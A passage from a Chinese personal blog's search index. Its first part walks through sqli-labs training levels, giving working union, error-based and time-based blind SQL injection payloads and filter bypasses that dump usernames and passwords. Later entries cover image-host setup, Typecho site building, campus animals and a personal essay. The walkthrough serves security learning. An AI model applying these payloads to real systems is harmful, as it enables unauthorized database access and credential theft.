src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.8.png" alt="less-6.8"></p><p>Less-7~Less-9可以参考开头的链接</p><p>7、Less-11<br>POST表单提交，使用单引号闭合，和关卡12类似，在关卡12进行详细说明</p><p>8、Less-12<br>(1)为POST表单提交，在username中输入 <code>&#39; or 1=1 #</code>登陆失败，说明单引号’不作为闭合，则尝试使用双引号做闭合，依旧报错，再次尝试加上括号闭合。使用<code>&quot;) or 1=1 #</code>，”)闭合成功，同时注入 or 1&#x3D;1这个一定为真的条件，#注释后面的内容<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-12.1.png" alt="less-12.1"><br>(2)在username文本框输入：<code>&quot;) or 1=1 order by num #</code>，将num从2开始逐一增加，当num为3时报错，说明列数为2<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-12.2.png" alt="less-12.2"><br>(3)在username文本框中输入：<code>1&quot;) and 1=2 union select 1,2#</code>，有两个显示位，爆破数据库信息可以利用这两个显示位<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-12.3.png" alt="less-12.3"><br>(4)爆数据库信息和利用URL栏的GET方法是类似的，步骤同理关卡1。<br>   爆库：<code>1&quot;) and 1=2 union select 1,database()#</code><br>   爆表：<code>1&quot;) and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code><br>   爆列名：<code>1&quot;) and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code><br>   爆记录：<code>1&quot;) and 1=2 union select 1,2,group_concat(username,&quot;:&quot;,password) from users #</code></p><p>9、Less-13<br>类似关卡12，不同点在于使用<code>&#39;)</code>闭合</p><p>10、Less-14<br>类似关卡12，不同点在于使用<code>&quot;</code>闭合</p><p>11、Less-18<br>(1)为 POST 表单提交，在 username 中输入<code>&#39;or 1=1 #</code>和<code>&quot; or 1=1 #</code>等都显示登录失败，查看php文件，发现uname和passwd都做了check_input特殊处理<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.1.png" alt="less-18.1"><br>(2)check_input函数中，magic_quotes_gpc判断解析用户提示的数据，在magic_quotes_gpc &#x3D; On的情况下，如果输入的数据有单引号（’）、双引号（”）、反斜线（\）与 NULL等字符都会被加上反斜线。stripslashes()删除由 addslashes() 函数添加的反斜杠、ctype_digit()判断是不是数字，mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符，intval() 进行整型转换。这说明username和password都不能作为注入点。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.2.png" alt="less-18.2"><br>(3)用户名和密码输入admin，页面有user-agent的回显，猜测注入点在user-agent，使用单引号闭合。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.3.png" alt="less-18.3"><br>(4)爆库名：使用burpsuit抓包，将User-Agent改为SQL注入语句: <code>&#39;and extractvalue(1,concat(0x23,(select database()),0x23)) and &#39;</code>，通过报错注入将数据名回显<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.4.png" alt="less-18.4"><br>(5)爆表名：可以选择使用updatexml报错回显，payload为<code>1&#39;,1,updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)) #</code>，也可以使用extractvalue报错回显，payload为<code>&#39;and extractvalue(1,concat(0x23,( select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23)) and &#39;</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.5.png" alt="less-18.5"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.6.png" alt="less-18.6"><br>(6)爆列名：使用updatexml函数报错注入，payload为 <code>&#39;,updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;uagents&#39;),0x23),1)) #</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.7.png" alt="less-18.7"><br>(7)爆记录：使用updatexml报错注入，payload为：<code>&#39;,updatexml(1,concat(0x23,(select group_concat(username,&quot;:&quot;,password) from users),0x23),1)) #</code>，有长度限制所以只显示了部分，则也可以username和password分别使用<code>&#39;,updatexml(1,concat(0x23,(select username/password from users limit num,1),0x23),1)) #</code> （num从0开始逐一递增）将数据一个一个回显<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.8.png" alt="less-18.8"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.9.png" alt="less-18.9"></p><p>12、Less-19<br>和关卡18类似，注入点在referer</p><p>13、Less-20<br>和关卡18类似，注入点在cookie</p><p>14、Less-26<br>(1)根据提示输入<code>?id=1</code>，用户名和密码显示正常，添加单引号<code>&#39;</code>，提示语法错误，说明单引号被拼接到后台SQL查询语句，添加–+注释发现依旧报错，猜测对–+进行了过滤。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.1.png" alt="less-26.1"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.2.png" alt="less-26.2"><br>(2)使用<code>&#39;</code>闭合，对于注释&#x2F;结尾字符，用<code>;%00</code>作为结尾<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.3.png" alt="less-26.3"><br>(3)使用order by，页面报错显示or被过滤，使用双写、空格、注释等多次尝试，发现空格，or，and,&#x2F;*,#,–,&#x2F;等符号都被过滤。直接采用报错注入方式。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.4.png" alt="less-26.4"><br>(4)爆库名：构造payload为<code>?id=1&#39; aandnd(updatexml(1,concat(0x23,database(),0x23),1));%00</code>，使用双写避免and被过滤，windows上的apache对空格编码的转义有问题，需要使用()绕过空格<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.5.png" alt="less-26.5"><br>(5)爆表名：构造payload为：<code>?id=1&#39; || updatexml(1, concat(0x7e, (select (group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema=database()))) ,1)  || &#39;1&#39;=&#39;1</code>，其中由于information存在or，需要双写。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.6.png" alt="less-26.6"><br>(6)爆列名：与爆表名类似，构造payload为：<code>id=1&#39; || updatexml(1, concat(0x7e, (select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name=&#39;users&#39;))) ,1)  || &#39;1&#39;=&#39;1</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.7.png" alt="less-26.7"><br>(7)爆记录：构造payload为将用户名和密码从users表中回显：<code>id=1&#39; || updatexml(1, concat(0x23, (select (group_concat(  concat_ws(0x7e,username, passwoorrd)  )) from (users))) ,1)  || &#39;1&#39;=&#39;1</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.8.png" alt="less-26.8"><br>也可以使用<code>id=1&#39; || updatexml(1, concat(0x7e, (select (group_concat( concat_ws(0x7e,username,passwoorrd))) from (users) where(id=num))) ,1)  || &#39;1&#39;=&#39;1</code>，通过改变id的值单个记录显示<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.9.png" alt="less-26.9"><br>15、Less-64<br>(1)构造<code>id=1&#39;</code>，页面没有显示用户信息也没有SQL语句语法报错，则添加–+注释，对id&#x3D;1’、id&#x3D;1”、id&#x3D;1’)、id&#x3D;”)、id&#x3D;1))等依次尝试，当<code>id=))--+</code>时页面返回id&#x3D;1的用户信息<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.1.png" alt="less-64.1"><br>(2)构造<code>id=1)) order by num--+</code>，num从1开始递增，当num为3时页面正常，num为4时无显示，说明数据有3列<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.2.png" alt="less-64.2"><br>(3)使用联合查询找注入点，结果不可行<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.3.png" alt="less-64.3"><br>(4)使用时间注入方式判断，payload为<code>id=1)) and sleep(3)--+</code>，有延迟，进行时间注入<br>(5)数据库名长度：构造payload为<code>id=1)) and if(length(database())=8,1,sleep(2))--+</code>，页面返回正确且较快，当长度为7和9时都有延迟，说明数据库名长度为8<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.4.png" alt="less-64.4"><br>(6)构造payload：<code>id=1)) and if(left(database(),1)=&#39;s&#39; , sleep(3), 1) --+</code>，页面返回正确且较快，当为其他的字母时有延迟。通过改变<code>left(database(),num)</code>中num的大小以及匹配的字符，将数据库名得出<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.5.png" alt="less-64.5"><br>(7)由于手动一次次尝试较为麻烦，可以使用burpsuit进行爆破，url中payload为<code>id=1))and if(left(database(),1)=&#39;s&#39; , sleep(1), 1) --+</code>，使用burp抓包，将数据发送给intruder，清除原有变量，重新选定变量为第num个字符和字符，配置有效载荷进行爆破。但是由于Less-64只提供130次尝试，所以有限制。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.6.png" alt="less-64.6"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.7.png" alt="less-64.7"><br>(8)数据库名：构造payload：<code>id=1))and if(left(database(),8)=&#39;security&#39; , sleep(2), 1) --+</code>，页面返回正常且较快则说明数据库名为security<br>(9)爆表：构造payload：<code>id=1)) and if(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;e&#39;,1,sleep(2))--+</code>，和数据库名的爆破相同，仅需修改substr的第二个参数值和设定的字符。<br>(10)爆列：构造payload为：<code>id =1)) and if(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;u&#39;,1,sleep(2))--+</code>，修改substr的第二个参数值和设定的字符。<br>(11)爆记录：构造payload为：<code>id=1))and if(substr((select username from security.users limit 0,1),1,1)=&#39;d&#39;,1,sleep(2))--+</code>，修改substr的第二个参数和设定的字符，密码爆破相同</p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习站点推荐</title>
      <link href="/knowledge/6.html"/>
      <url>/knowledge/6.html</url>
      
        <content type="html"><![CDATA[<p>编程语言学习：<a href="https://www.runoob.com/">菜鸟教程</a>、<a href="https://www.w3school.com.cn/">w3school</a><br>论坛&#x2F;社区：<a href="https://blog.csdn.net/">CSDN</a>、<a href="https://www.cnblogs.com/">博客园</a>、<a href="https://www.jianshu.com/">简书</a>、<a href="https://www.freebuf.com/">Freebuf</a>、<a href="http://blog.nsfocus.net/">绿盟科技</a>、<a href="https://github.com/">Github</a>、<a href="https://juejin.cn/">掘金</a>、<a href="https://segmentfault.com/">思否</a>、<a href="https://bbs.pediy.com/">看雪论坛</a>、<a href="https://www.51cto.com/">51CTO</a></p>]]></content>
      
      
      <categories>
          
          <category> knowledge </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>搭建Github个人图床</title>
      <link href="/technique/5.html"/>
      <url>/technique/5.html</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>图床一般指储存图片的服务器，将图片上传至图床后可以直接通过外链访问，利用图床进行图片存储可以减轻网站服务器的压力、提供CDN加速等等。</p><h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><p>目前的有许多图床平台供选择，比如<a href="https://cloud.tencent.com/">腾讯云COS</a>、Github图床、<a href="https://www.aliyun.com/product/oss/">阿里云OSS</a>、<a href="https://portal.qiniu.com/">七牛云图床</a>、<a href="https://sm.ms/">SM.MS图床</a>等，更多国内图床可以参考知乎链接：<a href="https://zhuanlan.zhihu.com/p/35270383">盘点国内免费好用的图床</a>。在对比不同图床的稳定性、容量、价格等因素后，选择了免费又可靠的Github图床。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>图床工具：PicGo  <a href="https://github.com/Molunerfinn/PicGo">下载地址</a><br>选择本地的图片上传工具可以方便我们快速上传图片并且获取图片外链，PicGo是较为推荐的工具，它提供剪切板图片上传、多种图片外链格式、支持多种图床……<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/ImgHost/PicGo.png" alt="PicGo"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>（1）Github配置</p><p>①登录<a href="https://github.com/">Github</a>，创建新的仓库，权限设置为public</p><p>②点击settings-&gt;Developer settings-&gt;Personal access tokens-&gt;tokens (classic)-&gt;Generate new token，选择repo权限后点击绿色的Generate token按钮，成功生成token，需要将其记录下来避免再次生成。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/ImgHost/token.png" alt="token"></p><p>（2）PicGo配置<br>点击PicGo中的Github图床配置，按照“账户名&#x2F;仓库名”的格式设置仓库名；分支名填写github仓库的默认分支（2020.10.01后，github的默认分支名由master变更为main，也可以选择其他分支，但是自定义域名格式处需要对应）；将Github配置图床时的token粘贴至设定token的文本框中；存储路径可选；为了使用CDN加快图片的访问速度，自定义域名格式为：<a href="https://cdn.jsdelivr.net/gh/GitHub%E7%94%A8%E6%88%B7%E5%90%8D/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93%E5%90%8D@main%EF%BC%9B%E7%82%B9%E5%87%BB%E7%A1%AE%E5%AE%9A%E3%80%82">https://cdn.jsdelivr.net/gh/GitHub用户名/图床仓库名@main；点击确定。</a><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/ImgHost/PicGo-settings.png" alt="PicGo配置"></p><h2 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h2><p>（1）使用PicGo上传图片至指定的Github图床仓库，如果要进行图片的删除，在PicGo中操作不会对Github中的图片进行删除。</p><p>（2）如果上传的图片过大或者因为服务器不稳定导致PicGo上传失败，可以直接进入Github的图床仓库上传图片，访问的外链则使用PicGo中的自定义域名加具体图片路径。</p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> image host </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typecho建站Tips</title>
      <link href="/technique/4.html"/>
      <url>/technique/4.html</url>
      
        <content type="html"><![CDATA[<h2 id="域名以及服务器"><a href="#域名以及服务器" class="headerlink" title="域名以及服务器"></a>域名以及服务器</h2><p>提供域名购买的网站有许多，包括阿里的<a href="https://wanwang.aliyun.com/">万网</a>、世界最大的域名注册商<a href="https://sg.godaddy.com/zh">Godaddy</a>、腾讯的<a href="https://dnspod.cloud.tencent.com/">腾讯云</a>、华为的<a href="https://www.huaweicloud.com/product/domain.html">华为云</a>等，域名注册的网站一般都提供首年特惠或者直接购买多年平均下来比续费划算的方案，不同的域名注册网站价格也稍有变化，国内的貌似更便宜些。</p><p>提供服务器购买的网站除了上面的阿里腾讯华为，还有<a href="https://www.youwebcloud.com/">优网</a>、<a href="http://www.zhujike.com/">主机壳</a>、<a href="https://cloud.baidu.com/">百度智能云</a>等，目前国内的两大巨头还是阿里云和腾讯云，都提供学生优惠，不过阿里率先进入这个行业，可能稳定性和安全性方面稍强（猜测？</p><p>在国内注册购买域名一般需要进行网站备案，腾讯、阿里、华为都提供较为便捷的备案流程，这里选择的是阿里的域名和它提供的学生优惠服务器。</p><p>（1）域名购买</p><p>购买域名步骤：</p><p>①实名认证<br>域名持有者信息需要与备案主体信息保持一致，包含姓名、证件类型、证件号码邮箱等等，其中邮箱需要进行真实性认证。</p><p>②查询想购买的域名后缀是否能备案<br>进入工信部网站的<a href="http://域名.信息/?spm=a2c4g.11186623.2.25.43314dc1O7oJzn#">中国互联网体系</a>查看工信部已经批复的域名后缀。</p><p>③域名购买<br>将域名加入清单进行结算，选择购买年限、选择域名持有者为个人并添加实名认证的个人信息模板，接着同意域名购买条款后购买。</p><p>（2）服务器购买<br>针对搭建个人小型网站的需求，轻量应用服务器就能满足。步骤如下：<br>①进行学生认证</p><p>②服务器地域节点选择<br>根据自己所在的地域选择服务器地域，目前大陆的服务器地域包含华北1（青岛）、华北2（北京）、华北3（张家口）、华北5（呼和浩特）、华东1（杭州）、华东2（上海）、华南1（深圳），选择一个较近的地域减小延时。</p><p>③镜像选择<br>阿里云轻量应用服务器提供应用镜像和系统镜像，系统镜像是单纯的Linux系统，而应用镜像则是部署了软件和环境的系统。对于不了解Linux系统操作或者希望一键使用的人可以直接选择相应的应用镜像，想自己配环境的则可以选择合适的系统镜像。</p><p>④绑定域名进行域名解析<br>为了成功进行备案，至少购买三个月的服务器。服务器购买成功后进入其管理页面，查看对应的公网IP。将购买的域名进行添加，按照提示进行A记录解析。</p><p>⑤服务器管理软件安装<br>如果选择的是系统镜像，为了方便可以下载提升运维效率的宝塔Linux面板，宝塔支持一键LAMP（Linux、Apache、Mysql、phpstudy）以及LNMP（Linux、Nginx、Mysql、phpstudy）等多项服务器管理功能。宝塔需要开放系统的8888端口，在安全组中的防火墙设置里添加规则将8888端口开放。</p><p>点击服务器的远程连接，在终端输入以下命令进行宝塔的安装：<br><code>wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh</code><br>安装成功后会出现宝塔面板的访问网址以及用户名和密码，将网站复制粘贴至导航栏进行访问，输入对应的用户名和密码，即可进入宝塔界面。宝塔登陆后会自动跳出安装web环境的界面，根据个人需求选择，比如我选择的是LAMP，如果下载失败可以点击软件商店再次下载。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/BT-1.png" alt="宝塔界面"><br>初始的宝塔账户和密码不方便记忆，可以点击面板设置自定义。</p><h2 id="域名备案"><a href="#域名备案" class="headerlink" title="域名备案"></a>域名备案</h2><p>具体的备案流程见阿里云的<a href="https://help.aliyun.com/document_detail/61819.html?spm=a2c4g.11186623.3.2.56fc7bb3drkZ0l">ICP备案流程</a>，帮助文档比较详细。需要注意的是，在购买域名并进行实名认证后，为了确保实名认证信息入库管局，建议在实名认证完成后的三天再申请备案，否则可能存在管局审核检查不到最新域名实名认证信息，导致备案失败。</p><p>直接使用阿里的备案服务，在填写网站名称时可以根据网站名称指引进行填写，需要注意一些敏感词是不被允许的。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/step-1.png" alt="网站名称填写"><br>提交备案信息后阿里的工作人员会拨打电话进行备案信息的确认，如果网站名称不合适会进行告知并且帮助修改。</p><p>在阿里提交备案信息后工信部会发送短信进行认证，需要在收到信息后的24小时内登录<a href="https://beian.miit.gov.cn/?spm=a2c4g.11186623.2.19.56d14b11fEgHLN#/Integrated/ComplaintA">工信部备案管理系统</a>进行验证。</p><p>由于阿里的备案流程界面短信校验进度不会及时更新，所以只要看到“尊敬的ICP用户：您的短信核验已全部完成，该请求将提交管局审核”就不必担心，耐心等待审核结果。</p><p>验证成功后将会提交至管局进行审核，审核成功后将会收到工业和信息化部发送的ICP备案号，至此备案成功。</p><h2 id="typecho模板使用"><a href="#typecho模板使用" class="headerlink" title="typecho模板使用"></a>typecho模板使用</h2><p>在宝塔界面点击网站添加站点，填写对应网站的信息，根目录默认为&#x2F;www&#x2F;wwwroot，添加成功后会创建相应域名的文件夹。安装typecho模板和主题的步骤如下：</p><p>①模板下载安装<br>进入tepecho官网<a href="http://typecho.org/download">下载页</a>，查看其正式版的环境需求（宝塔中安装的php版本需要满足在5.4以上），下载后进行解压，将文件放置在对应的域名文件夹下，如果还未备案成功需要通过IP访问进行typecho安装，备案成功后经域名解析通过IP和域名都可进行访问，按照页面提示创建账户进行模板安装。</p><p>②主题安装<br>提供typecho主题的站点：typecho官方主题站点<a href="https://typecho.me/">Typecho Themes</a>、<a href="https://www.npc.ink/tag/typecho-theme">Npcink</a>等，选择喜欢的主题下载后将文件夹放入&#x2F;usr&#x2F;themes目录下</p><p>③主题应用<br>访问自己的网站进入后台点击控制台选项中的外观，启用安装好的主题，本人主题使用说明<a href="https://zhebk.cn/Web/userAkina.html">Akina</a></p><h2 id="开启HTTPS"><a href="#开启HTTPS" class="headerlink" title="开启HTTPS"></a>开启HTTPS</h2><p>阿里目前提供免费的SSL证书服务，详情如下图<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/SSL.png" alt="阿里SSL"><br>证书部署步骤如下：</p><p>①认证<br>按照阿里提示的操作步骤，购买成功后提交证书申请材料并进行域名所有权认证，成功后证书签发。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/cert.png" alt="已签发"></p><p>②下载和配置<br>点击证书下载按钮，根据服务器类型下载对应证书。我的服务器为Apache，证书包含的文件如下<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/crt.png" alt="证书"><br>进入宝塔界面，点击个人网站中的设置，选项中存在SSL，点击其他证书，将下载的证书文件中的key文件粘贴至密钥key文本框，如果是Apache服务器的证书，将public.crt放在前面，chain.crt放在后面粘贴在证书PEM格式的文本框中，若是Nginx则按照PEM格式证书拼接的提示。粘贴完毕后点击保存按钮并开启窗口右上角的强制HTTPS，证书部署成功后显示绿色的文本框提示。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/BT-SSL.png" alt="BT-SSL"><br>进入typecho文件目录，编辑config.inc.php文件，添加如下代码：</p><pre><code>define(&#39;__TYPECHO_SECURE__&#39;, &#39;true&#39;);</code></pre><p>浏览器上进入网站后台，在设置-&gt;基本设置中的站点地址输入开启HTTPS后的URL链接</p><h2 id="配置伪静态"><a href="#配置伪静态" class="headerlink" title="配置伪静态"></a>配置伪静态</h2><p>（1）如果直接使用宝塔面板进行管理，则可以进入宝塔管理界面，点击网站-&gt;设置-&gt;伪静态，在“规则转换工具”左侧的下拉框中选择“wordpress”或者“typecho”进行保存（这里宝塔的版本不同会有差异）。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/apache-config.png" alt="伪静态配置"></p><p>（2）如果不使用宝塔面板的伪静态配置，可以参考<a href="https://www.typechodev.com/servers/remove_index_for_apache.html">Apache伪静态</a>，但是需要注意apache配置文件所在的位置以及修改添加的代码中的个人网站目录</p><p>（3）进入网站后台，点击设置-&gt;永久链接，启用地址重写功能，出现错误后勾选仍然启用。</p><p>PS：由于是之前搭建的网站，有一些细节方面可能说的不太准确，欢迎指正(╹ڡ╹ )</p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> website </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>江安动物园</title>
      <link href="/life/2.html"/>
      <url>/life/2.html</url>
      
        <content type="html"><![CDATA[<p>  相信大家都听说过“江安动物园”这个说法，今天小编带大家感受一下。</p><p><strong>可爱鸭鸭</strong></p><p>明远湖鸭鸭——游泳健将</p><p>在长桥经过的时候经常可以看见鸭鸭游得飞快（只能看见小水花），今天小编准备去采访它们，没想到鸭鸭整齐排着队等着我！<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/duck.png" alt="duck"></p><p>随处可见鸭鸭——富贵老板</p><p>在校园里同学们的电动车车头上站着黄色鸭鸭，墨镜+金链子一看就是富贵老板！但是，喂喂喂，为啥给老板墨镜戴反了！<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/boss.png" alt="boss1"></p><p><strong>慵懒猫猫</strong></p><p>液态猫猫——大鸡腿</p><p>江安的围合环境适合长猫猫，经常看到各位幸运人士炫耀长在宿舍床上的猫猫，小编很是羡慕，于是跑到草丛抓猫猫（不是<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/cat.png" alt="cat1"></p><p><strong>胖小啾啾</strong><br>江安的小麻雀经常在地面跳来跳去，于是从小路前往第一教学楼的路上经常可以看到肥硕的身影，走到它们跟前也不飞走，太美好了呜呜。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/animals/bird.png" alt="bird"></p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zoo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>停止内耗</title>
      <link href="/life/1.html"/>
      <url>/life/1.html</url>
      
        <content type="html"><![CDATA[<p>  最近在微博看到一个词，叫做“自我内耗”。</p><p>  在传统的定义中，内耗（Internal friction）主要是从群体的角度出发，比如百度百科就将内耗效应定义为在群体心理学中，人们把社会或部门内部因不协调、或矛盾等造成的人力、物力等方面无谓的消耗而产生的负效应现象。另一种解释则更侧重个体，指一个人既不能够接纳现实因素，又难以做到坦然放下，从而陷入一种进退两难的境遇里。</p><p>  小马(weibo:<a href="https://weibo.com/tututu214">一匹英俊的小马</a>)把她的内耗描述为没有做什么但感觉很疲惫或者明明有事需要做但提不起精神的状态，最终只会导致脑子里一个劲胡思乱想但是实际上只在消耗情绪和精气神，任务进度条一点没涨。</p><p>  最近我好像也经常处于这个自我内耗的状态。大三的课表较前两学年来说空了不少，但是这学期总感觉更累了。每次形教课的话题总是谈到考研、保研、工作等这些需要尽快确定的决定，同学之间在学科竞赛、科研论文等活动不断推进，一下子突然被push甚至来不及从适应期过渡。虽然说这些努力和决定都是自己的选择、和自己未来相关的事情，但是可能依旧不够成熟不能自己担起责任，总是想着顺其自然暂且这样过着。心里当然还是会有不甘，在颓废和上进里来回横跳，于是桌上摆笔记本手里拿手机刷来刷去这个怪诞的操作对我来说总是很熟练。等玩耍一番后又立马进入贤者模式，开始懊悔浪费了时间愧对自己愧对家人。这样反复的情绪变化最后带来的却主要是疲惫的心理，在教室坐下自习只会带着一脑子的混乱思想，效率低到难以置信。</p><p>  那些有目标并且为之奋斗，有一步一步规划并且日复一日坚持的人在我身边也很常见，我很佩服他们也想成为他们。当我赖在床上睡大觉的时候，当我抱着零食笔记本屏幕播着视频的时候，当我完成作业万事大吉专业学习丢一边的时候，他们在图书馆和教学楼自习，在参加比赛做实验写论文，在考驾照考雅思托福，看live演出跑步健身……并不是说因为没有花大量时间学习让我感到焦虑落后，而是不能将娱乐和学习平衡好，并且没有自我能力的提升长期处于干皱皱的海绵状态。日常几乎只有按部就班的上课、完成作业和娱乐活动，没有看课外书没有自主学习，连计划的每日背单词阅读英语文章实际上坚持一两天就搁浅了。虽然以肥宅标榜自己，将肥宅生活作为今后美好追求，但是还没有可以支持这种生活的基础（泪目，所以还是需要现阶段转换状态。</p><hr><p>  “脑子腾空做事；还没有发生的，不用去猜。”  希望我们都能停止内耗。<br> <img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/%E7%8B%97%E5%8B%BE.jpg" alt="dog"></p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinking </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
